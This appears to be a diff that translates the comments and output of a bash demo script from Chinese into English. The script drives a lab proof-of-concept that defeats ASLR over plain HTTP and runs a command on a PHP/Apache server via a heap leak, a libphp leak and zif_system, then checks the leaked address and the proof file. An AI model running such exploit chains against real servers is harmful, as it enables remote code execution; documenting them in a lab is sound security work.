@@ -19,15 +19,15 @@ restart_aslr() {
 }
 
 clear 2>/dev/null || true
-say "0) 目标页面（普通 echo，无 session_start）"
+say "0) Target page (plain echo, no session_start)"
 S cat /var/www/php-lab/www/index.php
 echo
 
-say "1) 远程证明 ASLR 已开启"
+say "1) Remote proof that ASLR is enabled"
 echo -n "kernel.randomize_va_space = "
 cat /proc/sys/kernel/randomize_va_space
-echo "Apache 启动方式: /usr/sbin/apache2ctl -k start（未使用 setarch -R）"
-echo "pure_aslr_run.sh 中 setarch 出现次数: $(grep -c setarch pure_aslr_run.sh || true)"
+echo "Apache startup method: /usr/sbin/apache2ctl -k start (setarch -R not used)"
+echo "setarch occurrences in pure_aslr_run.sh: $(grep -c setarch pure_aslr_run.sh || true)"
 restart_aslr
 M=$(pgrep -o -x apache2); W=$(worker)
 echo "master=$M worker=$W"
@@ -44,44 +44,44 @@ B2=$(libbase "$W2")
 echo "libphp base #1 = $B1"
 echo "libphp base #2 = $B2"
 if [ -n "$B1" ] && [ -n "$B2" ] && [ "$B1" != "$B2" ]; then
-  echo "=> 两次 Apache 重启后 libphp base 不同：ASLR 生效"
+  echo "=> libphp base differs after two Apache restarts: ASLR is active"
 else
-  echo "!! 两次 base 相同，请检查启动方式"
+  echo "!! The two bases are identical; check the startup method"
 fi
 
-say "2) 设置 display_errors=1（旧链的 A 需要 warning 输出置 headers_sent）"
+say "2) Set display_errors=1 (the legacy chain's A requires warning output to set headers_sent)"
 S sed -i 's/php_admin_value display_errors 0/php_admin_value display_errors 1/' /etc/apache2/conf-available/php8426.conf
 grep display_errors /etc/apache2/conf-available/php8426.conf
 S rm -f /tmp/p1
 
-say "3) 纯 HTTP ASLR 全链：堆泄漏 -> libphp 泄漏 -> zif_system"
+say "3) Full pure-HTTP ASLR chain: heap leak -> libphp leak -> zif_system"
 CHAIN_LOG=/tmp/demo_chain.log
 CMD="id>/tmp/p1" bash pure_aslr_run.sh 2>&1 | tee "$CHAIN_LOG"
 
-say "4) 命令执行结果"
+say "4) Command execution result"
 if S test -f /tmp/p1; then
   S cat /tmp/p1
 else
   echo "NO PROOF FILE"
 fi
 
-say "5) 交叉验证：泄漏的 libphp base vs 当前 worker maps"
+say "5) Cross-check: leaked libphp base vs current worker maps"
 LEAK=$(grep -oE 'libphp=0x[0-9a-f]+' "$CHAIN_LOG" | grep -v '=0x0$' | tail -1 | sed 's/.*=0x//')
 W=$(worker)
 if [ -n "${LEAK:-}" ] && [ -n "$W" ]; then
   MAP=$(libbase "$W")
-  echo "Set-Cookie 泄漏的 libphp base = 0x$LEAK"
-  echo "worker $W maps 中的 libphp  = $MAP"
+  echo "libphp base leaked via Set-Cookie = 0x$LEAK"
+  echo "libphp in worker $W maps = $MAP"
   if [ "0x$LEAK" = "0x$MAP" ]; then
-    echo "=> 完全一致：泄漏地址真实，ASLR 生效"
+    echo "=> Exact match: the leaked address is real and ASLR is active"
   else
-    echo "=> 不一致（worker 可能已轮换；见上方 W2 行）"
+    echo "=> Mismatch (the worker may have been replaced; see the W2 line above)"
   fi
 else
-  echo "无泄漏值或 worker 不存在，跳过"
+  echo "No leaked value or no worker; skipping"
 fi
 
-say "6) 恢复 display_errors=0"
+say "6) Restore display_errors=0"
 S sed -i 's/php_admin_value display_errors 1/php_admin_value display_errors 0/' /etc/apache2/conf-available/php8426.conf
 restart_aslr
 grep display_errors /etc/apache2/conf-available/php8426.conf
